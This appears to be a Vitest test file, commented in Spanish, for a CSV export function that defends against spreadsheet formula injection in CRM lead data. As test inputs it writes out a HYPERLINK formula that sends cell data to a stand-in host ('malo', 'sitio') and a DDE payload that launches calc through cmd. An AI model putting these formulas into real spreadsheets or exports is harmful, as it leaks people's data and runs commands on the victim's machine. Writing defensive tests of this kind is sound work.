// El CSV de leads del CRM lo abre Manolo en Excel, y su contenido lo escribe
// CUALQUIERA que rellene el formulario público de la landing. Una celda que
// empiece por `=`, `+`, `-` o `@` no es texto para Excel: es una fórmula, y se
// ejecuta al abrir el archivo (K-18.5).
//
// El ataque real no es teórico: `=HYPERLINK("https://sitio/?f="&A1&B1,"Ver")`
// pinta un enlace de aspecto normal que, al pulsarlo, manda a un tercero los
// datos de las otras filas del archivo.
import { describe, it, expect } from "vitest";
import { csvSeguro, armarCsv } from "@/lib/csv";

describe("csvSeguro — fórmulas", () => {
  const PELIGROSOS = [
    ['=HYPERLINK("https://malo/?f="&A1,"Ver")', "="],
    ["+1+1", "+"],
    ["-2+3", "-"],
    ["@SUM(A1:A9)", "@"],
    ["\tcosa", "tabulador"],
    ["\rcosa", "retorno de carro"],
  ];

  for (const [valor, que] of PELIGROSOS) {
    it(`neutraliza lo que empieza por ${que}`, () => {
      const salida = csvSeguro(valor);
      // El apóstrofo va PEGADO al principio del dato; Excel lo lee como "esto
      // es texto" y no lo pinta.
      const sinComillas = salida.startsWith('"') ? salida.slice(1, -1) : salida;
      expect(sinComillas.startsWith("'")).toBe(true);
    });
  }

  it("el apóstrofo queda DENTRO de las comillas, no fuera", () => {
    // Si se entrecomillara primero y se neutralizara después, el apóstrofo
    // caería fuera del campo y no protegería nada.
    expect(csvSeguro('=A1,"x"')).toBe(`"'=A1,""x"""`);
  });

  it("no toca un dato normal", () => {
    expect(csvSeguro("Hotel Paraíso Encantado")).toBe("Hotel Paraíso Encantado");
    expect(csvSeguro("ana@correo.mx")).toBe("ana@correo.mx");
    expect(csvSeguro(3500)).toBe("3500");
  });

  it("un correo NO empieza por @, así que no se toca", () => {
    // El arroba en medio es lo normal; sólo importa el arroba INICIAL.
    expect(csvSeguro("contacto@hotel.mx")).not.toContain("'");
  });

  it("null y undefined salen como celda vacía, no como texto", () => {
    expect(csvSeguro(null)).toBe("");
    expect(csvSeguro(undefined)).toBe("");
  });
});

describe("csvSeguro — el formato del CSV", () => {
  it("entrecomilla y duplica las comillas de dentro", () => {
    expect(csvSeguro('dijo "hola"')).toBe('"dijo ""hola"""');
  });

  it("entrecomilla lo que lleva coma", () => {
    expect(csvSeguro("Xilitla, SLP")).toBe('"Xilitla, SLP"');
  });

  it("entrecomilla lo que lleva salto de línea (las notas lo llevan)", () => {
    expect(csvSeguro("línea 1\nlínea 2")).toBe('"línea 1\nlínea 2"');
  });
});

describe("armarCsv", () => {
  const csv = armarCsv(
    ["Hotel", "Notas"],
    [
      ["Paraíso", "todo bien"],
      ["=cmd|' /c calc'!A1", "Xilitla, SLP"],
    ],
  );

  it("abre con BOM (sin él, Excel en Windows rompe los acentos)", () => {
    expect(csv.charCodeAt(0)).toBe(0xfeff);
  });

  it("una fila por línea, con su cabecera", () => {
    expect(csv.replace("﻿", "").split("\n")[0]).toBe("Hotel,Notas");
    expect(csv.split("\n")).toHaveLength(3);
  });

  it("ninguna celda del archivo arranca una fórmula", () => {
    for (const linea of csv.replace("﻿", "").split("\n")) {
      for (const celda of linea.split(",")) {
        expect(/^[=+\-@]/.test(celda)).toBe(false);
      }
    }
  });
});
